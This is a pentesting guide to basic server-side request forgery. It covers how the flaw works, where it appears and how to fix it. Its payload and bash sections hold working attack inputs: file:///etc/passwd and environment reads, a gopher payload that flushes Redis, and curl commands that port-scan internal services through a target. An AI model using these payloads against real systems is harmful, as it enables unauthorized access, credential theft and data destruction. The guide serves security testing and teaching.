# Basic SSRF — Internal Network Access

## Overview
Server-Side Request Forgery (SSRF) occurs when an attacker can cause a server to make HTTP (or other protocol) requests to an arbitrary destination on their behalf. The vulnerability exists because applications fetch remote resources (webhooks, URL previews, file imports, API integrations) without adequately validating or restricting the target URL. Because the request originates from the server, it can reach internal services, cloud metadata endpoints, and private network ranges that are completely inaccessible to the attacker directly.

## How It Works
The attacker supplies or manipulates a URL parameter that the server passes to an HTTP client library (e.g., `curl`, Python `requests`, Java `HttpClient`). The server resolves DNS and opens a TCP connection to the attacker-controlled destination. If the destination is an internal host (e.g., `http://192.168.1.1/admin`), the response is often reflected back to the attacker, exposing data from services that trust the server's own IP address. Even when responses are not directly reflected, timing differences, error messages, and out-of-band callbacks can confirm successful requests.

## Impact
- Read sensitive data from internal services (Redis, Elasticsearch, Memcached, internal APIs)
- Bypass firewall rules and network segmentation
- Enumerate internal network topology and open ports
- Access cloud instance metadata (AWS IMDSv1, GCP, Azure) to steal credentials
- Pivot to Remote Code Execution via services with unauthenticated APIs (e.g., Gopher to Redis)
- Bypass IP allowlists that trust the server's own IP
- Scan internal subnets for live hosts and services

## Where to Look
- Any parameter that accepts a URL: `url=`, `src=`, `href=`, `path=`, `dest=`, `redirect=`, `uri=`, `link=`, `fetch=`, `load=`
- Image/file import features: "Import from URL", "Fetch avatar from URL", "Load PDF from link"
- Webhook configuration endpoints
- PDF/screenshot/preview generation services
- XML parsers (XXE can trigger SSRF)
- `Host:` header manipulation in certain proxy configurations
- GraphQL queries with URL-type arguments
- Request bodies containing URLs in JSON/XML payloads
- `Referer` or `Origin` headers if the server fetches those values

## Testing Steps
1. Identify all parameters, headers, and body fields that accept URLs or hostnames.
2. Submit a request pointing to your own server (e.g., Burp Collaborator, interactsh, or `http://your-vps/ssrf-test`) to confirm the server makes outbound requests.
3. If the callback arrives, confirm the source IP is the target server's IP (not your browser's).
4. Replace the URL with `http://127.0.0.1/` and observe the response — length changes, error messages, or actual HTML indicate SSRF.
5. Probe common internal addresses: `http://10.0.0.1/`, `http://192.168.0.1/`, `http://172.16.0.1/`.
6. Scan for common internal ports: try `http://127.0.0.1:6379/` (Redis), `http://127.0.0.1:9200/` (Elasticsearch), `http://127.0.0.1:8080/` (dev server), `http://127.0.0.1:2375/` (Docker API).
7. If responses are reflected, extract data from internal service responses.
8. Try alternative schemas: `file:///etc/passwd`, `dict://127.0.0.1:6379/`, `gopher://`.

## Payloads / Techniques

```
# Basic internal access
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/

# Common internal service ports
http://127.0.0.1:6379/        # Redis
http://127.0.0.1:9200/_cat/indices  # Elasticsearch
http://127.0.0.1:27017/       # MongoDB (limited)
http://127.0.0.1:5432/        # PostgreSQL
http://127.0.0.1:3306/        # MySQL
http://127.0.0.1:11211/       # Memcached
http://127.0.0.1:2375/version # Docker API
http://127.0.0.1:8500/v1/kv/  # Consul
http://127.0.0.1:8080/        # Dev/management interface

# File read via file:// (if supported)
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///var/www/html/config.php

# Dict protocol (Redis interaction)
dict://127.0.0.1:6379/INFO

# Gopher to Redis (write arbitrary data)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

```bash
# Test with curl from attacker's server
curl -s 'https://target.com/fetch?url=http://YOUR-COLLAB.burpcollaborator.net/ssrf'

# Probe internal Elasticsearch
curl -s 'https://target.com/api/import?source=http://127.0.0.1:9200/_cat/indices?v'

# Quick port scan via SSRF (observe timing/errors)
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
  echo -n "Port $port: "
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/fetch?url=http://127.0.0.1:$port/"
  echo
done
```

## Burp Suite Tips
- Use **Burp Collaborator** (Burp menu > Burp Collaborator client) to generate unique URLs. Replace suspected URL parameters with your collaborator URL and poll for DNS/HTTP interactions.
- Enable **Proxy > Intercept**, submit a legitimate URL through the feature, then modify the URL in the intercepted request.
- Use **Intruder** with a port number payload list to scan `http://127.0.0.1:§PORT§/` — watch response length and time for differences.
- The **Param Miner** extension can discover hidden URL parameters in requests.
- **Collaborator Everywhere** (BApp Store) automatically injects Collaborator URLs into all parameters and headers.
- Use the **Logger++** extension to compare responses when fuzzing internal addresses — differences in Content-Length are a strong signal.

## Tools
- Burp Suite Pro (Collaborator, Intruder, Scanner)
- interactsh (`interactsh-client`) — open-source Collaborator alternative
- SSRFmap (https://github.com/swisskyrepo/SSRFmap) — automated SSRF exploitation
- Gopherus (https://github.com/tarunkant/Gopherus) — generate Gopher payloads for Redis, MySQL, etc.
- ffuf / feroxbuster — fuzz URL parameters at scale
- nuclei with SSRF templates

## Remediation
- Implement a strict allowlist of permitted URL schemes (`https://`) and destination hostnames/IPs.
- Resolve the destination hostname server-side and verify the resolved IP is not in RFC1918, loopback, link-local, or other reserved ranges before making the request.
- Block all non-HTTP schemes (`file://`, `dict://`, `gopher://`, `ftp://`).
- Enforce IMDSv2 on AWS EC2 instances (requires session token, preventing simple SSRF metadata access).
- Use a dedicated, isolated HTTP egress proxy for outbound requests from application code.
- Disable response body reflection when fetching remote URLs — do not return raw remote responses to the user.
- Apply network-level egress filtering so application servers cannot reach internal subnets or cloud metadata endpoints.

## References
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
https://portswigger.net/web-security/ssrf
https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
